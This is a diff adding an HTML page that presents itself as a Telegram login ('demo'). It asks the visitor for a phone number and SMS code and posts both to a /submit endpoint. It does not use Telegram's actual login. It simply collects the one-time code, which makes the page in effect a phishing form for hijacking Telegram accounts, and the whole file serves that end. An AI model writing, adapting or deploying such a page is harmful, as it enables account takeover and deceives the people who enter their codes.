@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Demo Login</title>
+</head>
+<body>
+    <h2>Войти через Telegram (демо)</h2>
+
+    <input type="text" id="phone" placeholder="Номер телефона"><br><br>
+    <input type="text" id="code" placeholder="Код из SMS"><br><br>
+
+    <button onclick="sendData()">Войти</button>
+
+    <script>
+        function sendData() {
+            const phone = document.getElementById("phone").value;
+            const code = document.getElementById("code").value;
+
+            fetch("/submit", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ phone, code })
+            })
+            .then(res => res.json())
+            .then(data => {
+                alert("Данные отправлены!");
+            })
+            .catch(err => {
+                alert("Ошибка отправки: " + err);
+            });
+        }
+    </script>
+</body>
+</html>
